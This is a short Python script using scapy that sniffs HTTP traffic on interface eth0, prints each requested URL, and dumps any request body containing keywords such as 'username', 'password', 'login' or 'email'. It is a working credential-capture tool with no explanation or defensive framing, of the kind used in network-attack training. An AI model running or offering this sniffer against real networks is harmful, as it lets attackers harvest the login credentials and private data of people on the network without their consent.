#!/usr/bin/env python
import scapy.all as scapy
from scapy.layers import http

def sniff(interface):
    scapy.sniff(iface=interface,store=False,prn=process_sniffed_packet)

def get_url(packet):
    return packet[http.HTTPRequest].Host + packet[http.HTTPRequest].Path

def process_sniffed_packet(packet):
    if packet.haslayer(http.HTTPRequest):
        url = get_url(packet)
        print(url)
        if packet.haslayer(scapy.Raw):
            load = packet[scapy.Raw].load
            try:
                load = load.decode('utf-8', errors='ignore')  # Decode bytes to string
            except UnicodeDecodeError:
                load = ""
            keywords = ["username","login","password","email","pass","user"]
            for keyword in keywords:
                if keyword in load:
                    print(str(load))


sniff("eth0")
